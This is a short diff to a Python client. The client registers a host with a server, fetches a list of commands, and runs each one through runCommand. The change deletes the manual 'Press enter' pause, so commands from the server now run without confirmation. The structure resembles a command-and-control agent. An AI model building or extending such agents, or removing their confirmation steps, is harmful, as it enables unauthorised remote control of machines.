@@ -51,10 +51,8 @@ def main():
     OS = platform.system()
     host_id = initHost(SERVER_IP,IP,OS) #init host 
     commands = getCommands(SERVER_IP,host_id)
-    #parse commands into list here
-    commands = ast.literal_eval(commands)
+    commands = ast.literal_eval(commands) #parse commands into list
     for command in commands:
-        input("Press enter to POST command responses")
         print(command)
         runCommand(SERVER_IP,host_id,command)
     pass
